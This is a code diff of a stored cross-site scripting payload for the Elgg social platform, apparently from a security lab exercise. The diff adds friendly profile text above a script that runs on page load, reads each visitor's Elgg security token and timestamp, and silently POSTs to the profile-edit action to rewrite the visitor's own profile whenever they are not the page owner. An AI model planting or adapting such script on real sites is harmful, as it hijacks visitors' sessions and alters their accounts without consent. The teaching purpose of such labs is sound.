@@ -1,15 +1,15 @@
+<p>Welcome to my profile! I'm thrilled to share a bit about myself with you.</p>
+<p>
+  Feel free to explore my profile to learn more about who I am, what I do, and
+  what I'm passionate about.
+</p>
 <script type="text/javascript">
   window.onload = function () {
-    //JavaScript code to access user name, user guid, Time Stamp __elgg_ts
-    //and Security Token __elgg_token
-    var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
-    var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
-    //Construct the content of your url.
     var sendurl = "/action/profile/edit"; //FILL IN
     var params = {
       __elgg_ts: elgg.security.token.__elgg_ts,
       __elgg_token: elgg.security.token.__elgg_token,
-      name: Math.random().toString(36).substring(7),
+      name: elgg.session.user.username,
       description: "190572",
       "accesslevel[description]": 1,
       briefdescription: Math.random().toString(36).substring(7),
@@ -40,11 +40,9 @@
       .join("&");
 
     if (elgg.page_owner.guid != elgg.session.user.guid) {
-      //Create and send Ajax request to modify profile
       var Ajax = null;
       Ajax = new XMLHttpRequest();
       Ajax.open("POST", sendurl, true);
-      // Ajax.setRequestHeader("Host","www.seed-server.com");
       Ajax.setRequestHeader(
         "Content-Type",
         "application/x-www-form-urlencoded"
